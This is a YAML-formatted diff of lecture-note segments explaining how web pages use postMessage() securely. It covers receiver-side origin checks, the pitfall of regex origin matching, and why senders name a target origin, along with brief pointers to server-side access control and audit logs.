+- en: A web page also needs to use postMessage() securely.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Two frames from different origins can use postMessage() to asynchronously exchange
+    immutable strings.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Sender gets a reference to a window object, and does this: window.postMessage(msg,
+    origin);'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Receiver defines an event handler for the special "message" event. The event
+    handler receives the msg and the origin.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Q:** Why does the receiver have to check the origin of received message?'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**A:** To perform access control on senders! If the receiver implements sensitive
+    functionality, it shouldn''t respond to requests from arbitary origins.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Common mistake:** The receiver uses regular expressions to check the sender''s
+    origin.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Even if origin matches /.foo.com/, doesn't mean it's from foo.com! Could be
+    "xfoo.com", or "www.foo.com.bar.com".
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'More details: [The Postman Always Rings Twice](https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf)'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Q:** Why does the sender have to specify the intended origin of the receiver?'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**A:** postMessage() is applied to a window, not an origin.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Remember that an attacker may be able to navigate a window to a different location.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If the attacker navigates the window, another origin may receive message!
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If the sender explictly specifies a target origin, the browser checks recipient
+    origin before delivering the msg.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'More details: [Securing Frame Communication in Browsers](http://css.csail.mit.edu/6.858/2013/readings/post-message.pdf)'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: There are many other aspects to building a secure web application.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Ex: ensure proper access control for server-side operations.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Django provides Python decorators to check access control rules.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Ex: Maintain logs for auditing, prevent an attacker from modifying the log.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
